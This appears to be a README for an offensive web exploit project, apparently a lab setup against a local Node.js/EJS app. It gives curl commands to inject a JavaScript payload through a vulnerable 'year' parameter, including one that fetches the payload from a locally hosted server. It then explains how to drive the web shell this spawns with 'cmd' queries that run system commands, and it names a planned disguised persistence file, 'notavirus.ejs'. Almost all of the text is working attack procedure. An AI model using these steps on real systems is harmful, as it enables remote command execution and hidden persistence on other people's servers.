<h1 align="center">Initial Stage (oneliner.js)</h2>

## How to inject the payload
### Method 1
Copy the contents of the payload file.
```
# Windows
type payload\oneliner.js | clip

# Linux
xclip -in payload/oneliner.js -selection clipboard
```
And paste it at the vulnerable endpoint.
```
curl -G --data-urlencode "year=<payload>" http://localhost:3000
```
### Method 2
Host a server from the `payload` directory and use cURL to inject the payload
1. `php -S 0.0.0.0:5000` or `python -m http.server 5000`
2. `curl -G --data-urlencode "year=$(curl -s http://localhost:5000/oneliner.js)" http://localhost:3000`

## How to use the payload

The payload will spawn a webshell which you can access from `http://localhost:8000`. You can specify commands by appending an HTTP GET query called `cmd`
```
1. curl -G --data-urlencode "cmd=<command>" http://localhost:8000
2. curl -G --data-urlencode "cmd=cat /etc/*-release" http://localhost:8000
3. (using the browser) http://localhost:8000/?cmd=cat /etc/*-release
```

<h1 align="center">Persistence Stage (notavirus.ejs)</h2>

Still thinking of a way to do this
